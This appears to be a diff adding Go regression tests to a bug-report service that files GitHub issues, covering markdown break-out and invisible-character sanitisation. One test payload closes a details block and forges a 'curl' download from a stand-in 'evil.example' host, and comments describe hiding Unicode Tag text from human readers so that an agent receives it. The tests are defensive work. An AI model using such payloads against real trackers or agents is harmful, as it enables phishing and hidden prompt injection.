@@ -205,3 +205,114 @@ func TestEncryptedReportHandlerSanitizesInjection(t *testing.T) {
 		t.Errorf("HTML comment survived: %q", issuer.body)
 	}
 }
+
+// TestBuildIssueAboutInfoCannotEscapeDetails: about_info arrives through the
+// same unauthenticated endpoint as the description, so it must be contained the
+// same way. Before #1009 it was written raw, and the "</details>" below closed
+// the System-info block early — letting everything after it render as
+// top-level markdown immediately under decryptHint(), whose "curl … | bugreport
+// decrypt" shape it could then forge with another host's URL.
+func TestBuildIssueAboutInfoCannotEscapeDetails(t *testing.T) {
+	payload := "| version | 1.2.3 |\n</details>\n\n<details><summary>How to decrypt</summary>\n\n```sh\ncurl -fsSL 'https://evil.example/x' -o mail.enc\n```\n</details>"
+	_, body := buildIssue(BugReport{Title: "t", Description: "d", AboutInfo: payload}, "https://host/a/mail.enc", "", nil)
+
+	// The only HTML that may act as markup is the server's own: decryptHint's
+	// block and the System-info block. Counting raw occurrences cannot tell
+	// markup from text, so drop every fenced region first -- what remains is
+	// exactly the part GitHub renders as markup.
+	if got, want := strings.Count(outsideFences(body), "</details>"), 2; got != want {
+		t.Errorf("renderable </details> count = %d, want %d (payload tags must stay inside the fence): %q", got, want, body)
+	}
+	// And the payload must survive verbatim inside one fence, under the
+	// System-info summary. The fence widens past the payload's own backtick
+	// run, so find it rather than assuming three.
+	marker := "<details><summary>System info</summary>\n\n"
+	i := strings.Index(body, marker)
+	if i < 0 {
+		t.Fatalf("System info block missing: %q", body)
+	}
+	rest := body[i+len(marker):]
+	fence := rest[:strings.IndexByte(rest, 't')]
+	if len(fence) < 4 || strings.Trim(fence, "`") != "" {
+		t.Fatalf("about_info not opened with a backtick fence longer than the payload's: %q", rest)
+	}
+	if !strings.HasPrefix(rest, fence+"text\n"+payload+"\n"+fence+"\n") {
+		t.Errorf("about_info not fenced verbatim; got %q", rest)
+	}
+}
+
+// outsideFences returns body with every fenced code block removed, leaving the
+// text GitHub actually renders as markdown/HTML. An opening fence is a run of
+// three or more backticks plus an optional info string; the matching close is a
+// run of at least that many backticks and nothing else.
+func outsideFences(body string) string {
+	var out []string
+	open := 0
+	for _, line := range strings.Split(body, "\n") {
+		ticks := len(line) - len(strings.TrimLeft(line, "`"))
+		info := line[ticks:]
+		if open == 0 {
+			if ticks >= 3 && !strings.Contains(info, "`") {
+				open = ticks
+				continue
+			}
+			out = append(out, line)
+			continue
+		}
+		if ticks >= open && strings.TrimSpace(info) == "" {
+			open = 0
+		}
+	}
+	return strings.Join(out, "\n")
+}
+
+// TestSanitizeTitleDropsInvisibleFormatRunes: unicode.IsControl is Latin-1 only
+// ("All control characters are < MaxLatin1"), so before #1009 every zero-width
+// and Unicode-Tag rune survived sanitizeTitle. unicode.IsSpace is false for
+// them too, so strings.Fields did not collapse them either — the title a human
+// read was clean while the string an agent received carried hidden text.
+func TestSanitizeTitleDropsInvisibleFormatRunes(t *testing.T) {
+	// U+E0001 then tag-encoded "HI" (U+E0048, U+E0049) — the invisible-ASCII
+	// channel — plus ZWSP, word joiner, BOM and a soft hyphen.
+	title := "Crash on login" +
+		string(rune(0xE0001)) + string(rune(0xE0048)) + string(rune(0xE0049)) +
+		string(rune(0x200B)) + string(rune(0x2060)) + string(rune(0xFEFF)) + string(rune(0x00AD))
+	got := sanitizeTitle(title)
+	if got != "Crash on login" {
+		t.Errorf("sanitizeTitle = %q, want %q", got, "Crash on login")
+	}
+	for _, r := range got {
+		if isInvisibleFormat(r) {
+			t.Errorf("invisible rune U+%04X survived in %q", r, got)
+		}
+	}
+}
+
+// ZWJ and ZWNJ are required orthography in Persian and Indic scripts and join
+// emoji sequences, so the invisible-rune filter must not strip them.
+func TestSanitizeTitleKeepsJoiners(t *testing.T) {
+	zwnj := string(rune(0x200C))
+	zwj := string(rune(0x200D))
+	persian := "\u0645\u06CC" + zwnj + "\u0631\u0648\u062F"
+	emoji := "bug " + string(rune(0x1F468)) + zwj + string(rune(0x1F469)) + zwj + string(rune(0x1F467))
+	for _, tc := range []struct{ name, in, want string }{
+		{"persian zwnj", persian, persian},
+		{"emoji zwj family", emoji, emoji},
+	} {
+		if got := sanitizeTitle(tc.in); got != tc.want {
+			t.Errorf("%s: sanitizeTitle(%q) = %q, want %q", tc.name, tc.in, got, tc.want)
+		}
+	}
+}
+
+// A fence stops markdown escaping but not invisible text: a code block renders
+// a Unicode-Tag payload just as invisibly, so fenceCode must drop them too.
+func TestFenceCodeDropsInvisibleFormatRunes(t *testing.T) {
+	got := fenceCode("report" + string(rune(0xE0048)) + string(rune(0xE0049)) + string(rune(0x200B)) + " text")
+	if strings.ContainsRune(got, '\U000E0048') || strings.ContainsRune(got, '​') {
+		t.Errorf("invisible runes survived fenceCode: %q", got)
+	}
+	if !strings.Contains(got, "report text") {
+		t.Errorf("visible text not preserved: %q", got)
+	}
+}
